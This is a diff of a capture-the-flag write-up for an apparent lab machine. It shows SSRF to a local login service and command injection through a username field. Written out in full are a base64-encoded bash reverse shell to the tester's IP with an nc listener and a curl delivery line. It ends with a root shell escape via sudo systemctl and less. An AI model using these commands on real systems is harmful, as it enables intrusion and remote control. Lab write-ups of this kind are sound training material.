@@ -50,19 +50,16 @@ curl http://$IP:55555/test --data 'username=test;`ping -c 3 <my-IP>`'
 This sends a request to `$IP:55555/test`, which is my basket that redirects my request to `http://localhost:80/login`. There, i provide the username `test`, and i append the system command `ping -c 3 <my-IP>`. After inspecting the incoming `ping` packages using `sudo tcpdump -i tun0 icmp`, i notice that i am receiving `ping`s!
 
 1. I encode my reverse shell initiator into `base64` with the following command:
-
 ```bash
 echo 'bash -c "/bin/bash -i >& /dev/tcp/<my-IP>/1337 0>&1"' | base64
 ```
 
 2. I start my `nc` reverse shell listener:
-
 ```bash
 nc -lvnp 1337
 ```
 
 3. And initiate the reverse shell using this `curl`command:
-
 ```bash
 curl http://$IP:55555/test --data 'username=test;`echo <base64> | base64 -d | bash -i`'
 ```
@@ -94,3 +91,22 @@ It turns out that `puma` is allowed to execute:
 /usr/bin/systemctl status trail.service
 ```
 as `root`! [GTFOBins](https://gtfobins.org/gtfobins/systemctl/#inherit) tells me that `systemctl` may inherit from `less` (use it), which is why i can use the shell escape from `less`. Executing `systemctl` throws me in a `less` window, which is why i can simply type `!/bin/bash` to get a `root` shell! 
+
+### Summary
+
+Below is a visualized summary of the exploitation steps used in this machine to gain RCE.
+
+``` mermaid
+graph LR
+  A[HTTP<br>Service] -->|SSRF| B[localhost<br>service];
+  B -->|OS-Command<br>injection| C[OS-Code<br>execution];
+```
+
+The privilege escalation to the user `root` worked as follows:
+
+``` mermaid
+graph LR
+  A[SSH<br>Access] -->|Sudo<br>permission| B[systemctl];
+  B -->|calls| C[less];
+  C -->|open shell| D[Command<br>execution<br>as root];
+```
